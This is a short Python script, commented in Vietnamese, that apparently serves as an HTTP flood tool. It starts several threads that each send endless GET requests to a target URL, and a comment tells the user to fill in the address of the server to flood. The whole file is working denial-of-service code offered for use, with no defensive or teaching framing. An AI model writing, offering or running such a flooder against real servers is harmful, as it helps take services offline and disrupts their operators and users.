import requests
import threading

# Hàm gửi yêu cầu HTTP flood
def send_request(url):
    try:
        while True:
            response = requests.get(url)
            print(f"Sent request to {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

# Hàm chạy flood
def run_flood(url, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    url = "http://example.com" # Điền địa chỉ URL của server cần flood
    num_threads = 10 # Số lượng thread để gửi yêu cầu flood
   
    run_flood(url, num_threads)
